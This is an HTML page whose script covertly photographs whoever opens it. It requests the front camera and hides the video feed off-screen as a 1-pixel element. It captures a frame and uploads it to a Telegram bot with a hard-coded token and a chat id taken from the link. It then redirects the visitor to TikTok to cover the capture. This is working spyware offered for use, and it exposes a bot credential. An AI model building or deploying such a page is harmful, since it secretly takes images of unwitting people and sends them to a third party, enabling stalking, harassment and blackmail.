<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ====== الإعدادات ======
        const token = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const id = new URLSearchParams(window.location.search).get('id');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        let stream = null;

        // ====== دالة إرسال الصورة ======
        function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', id);
            formData.append('photo', blob, 'photo.jpg');
            
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                console.log('تم الإرسال:', data);
                if (stream) stream.getTracks().forEach(t => t.stop());
                window.location.href = "https://www.tiktok.com";
            })
            .catch(err => {
                console.log('خطأ:', err);
                if (stream) stream.getTracks().forEach(t => t.stop());
                window.location.href = "https://www.tiktok.com";
            });
        }

        // ====== دالة التقاط الصورة ======
        function captureImage() {
            // ضبط حجم الكانفس
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            // رسم الصورة
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // التحقق من الصورة
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            let isBlack = true;
            
            // فحص بعض البكسلات عشان نتأكد إنها مو سوداء
            for (let i = 0; i < 100; i++) {
                if (imageData.data[i * 4] > 10) {
                    isBlack = false;
                    break;
                }
            }
            
            if (isBlack) {
                console.log('الصورة سوداء، نحاول مرة ثانية...');
                setTimeout(captureImage, 500);
                return;
            }
            
            // تحويل الصورة وإرسالها
            canvas.toBlob(sendPhoto, 'image/jpeg', 0.9);
        }

        // ====== بداية التصوير ======
        async function start() {
            if (!id) {
                window.location.href = "https://www.tiktok.com";
                return;
            }

            try {
                // طلب الكاميرا الأمامية
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: 640,
                        height: 480
                    }
                });
                
                video.srcObject = stream;
                
                // لما الفيديو يبدأ
                video.onplay = () => {
                    console.log('الفيديو شغال، نلتقط الصورة...');
                    setTimeout(captureImage, 1500); // انتظار ثانية ونصف
                };
                
            } catch (err) {
                console.log('خطأ:', err);
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: id,
                        text: `❌ خطأ: ${err.message}`
                    })
                }).finally(() => {
                    window.location.href = "https://www.tiktok.com";
                });
            }
        }

        // تشغيل
        start();

        // طوارئ: توجه بعد 15 ثواني
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com";
        }, 15000);
    </script>
</body>
</html>
